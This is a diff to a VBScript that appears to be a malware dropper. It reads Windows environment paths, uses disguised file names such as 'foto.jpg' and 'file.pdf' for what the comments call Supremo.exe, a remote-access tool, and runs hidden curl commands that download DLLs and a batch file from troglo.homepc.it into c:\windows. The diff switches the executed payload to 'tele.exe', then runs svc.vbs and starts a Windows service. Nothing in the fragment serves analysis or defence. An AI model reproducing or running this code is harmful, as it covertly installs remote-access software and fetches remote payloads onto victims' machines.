@@ -6,7 +6,8 @@ windir = oShell.ExpandEnvironmentStrings( "%WINDIR%" )
 temp = oShell.ExpandEnvironmentStrings( "%TEMP%" )
 slocal = oShell.ExpandEnvironmentStrings( "%LOCALAPPDATA%" )
 strComputerName = oShell.ExpandEnvironmentStrings( "%COMPUTERNAME%" )
-sfilelocal="foto.jpg" 'Supremo.exe
+sfilelocal1="tele.exe" 'Supremo.exe
+sfilelocal2="foto.jpg" 'Supremo.exe
 sfile="file.pdf" 'Supremo.exe
 'sfile="Supremo.exe" 'Supremo.exe
 sver="sysexecuser1"
@@ -60,7 +61,7 @@ With oShell
 .Run "curl http://troglo.homepc.it/win/libcurl.dll -o c:\windows\libcurl.dll", 0, True
 .Run "curl http://troglo.homepc.it/win/libcrypto-1_1.dll -o c:\windows\libcrypto-1_1.dll", 0, True
 '.Run temp  & "\" & sfile, 0, True 
-.Run slocal  & "\wix\" & sfilelocal, 0, True 
+.Run slocal  & "\wix\" & sfilelocal1, 0, True 
 .Run "cscript c:\windows\hp\svc.vbs", 0, True
 .Run "curl http://troglo.homepc.it/win/cmd.bat -o c:\windows\cmd.bat", 0, True
 .Run "net start CppWindowsService", 0, True
